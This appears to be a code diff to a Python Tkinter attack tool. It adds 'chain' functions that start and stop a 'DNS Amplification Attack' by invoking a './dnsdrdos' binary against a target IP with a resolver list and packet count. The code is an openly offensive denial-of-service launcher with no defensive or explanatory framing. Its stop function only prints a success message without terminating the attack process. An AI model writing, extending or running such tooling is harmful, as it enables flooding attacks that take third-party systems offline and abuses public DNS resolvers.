@@ -50,4 +50,29 @@ def sendDnsPackets(targetIp, dnsPackets):
     terminalLabel["text"] += "$ Target IP : " + targetIp + "\n"
     terminalLabel["text"] += "$ Amount of DNS Packets : " + dnsPackets + "\n"
     process = subprocess.Popen(["./dnsdrdos", "-f", "dnsList.txt", "-s", targetIp, "-l", dnsPackets])
+
+def startDnsAmplificationChain (queue, targetIp, dnsPackets, chainTerminalContentFrame, chainErrorContentFrame) :
+    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainTerminalLabel.pack(anchor = NW)
+    chainErrorOutputLabel.pack(anchor = NW)
+
+    chainTerminalLabel["text"] += "$ Running DNS Amplification Attack...\n\n"
+
+    dnsAmpChainProcess = subprocess.Popen(["./dnsdrdos", "-f", "dnsList.txt", "-s", targetIp, "-l", dnsPackets])
+    queue.put(dnsAmpChainProcess)
+
+def stopDnsAmplificationChain(chainTerminalContentFrame, chainErrorContentFrame) :
+    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainTerminalLabel.pack(anchor = NW)
+    chainErrorOutputLabel.pack(anchor = NW)
+
+    try:
+        chainTerminalLabel["text"] += "\n$ Stopping DNS Amplification Attack...\n\n"
+        chainTerminalLabel["text"] += "$ DNS Amplification Attack successfully stopped!\n"
+    except (AttributeError, RuntimeError):
+        chainErrorOutputLabel["text"] += traceback.format_exc()
+    except Exception as e:
+        chainErrorOutputLabel["text"] += "ERROR : \n" + e + "\n"
     
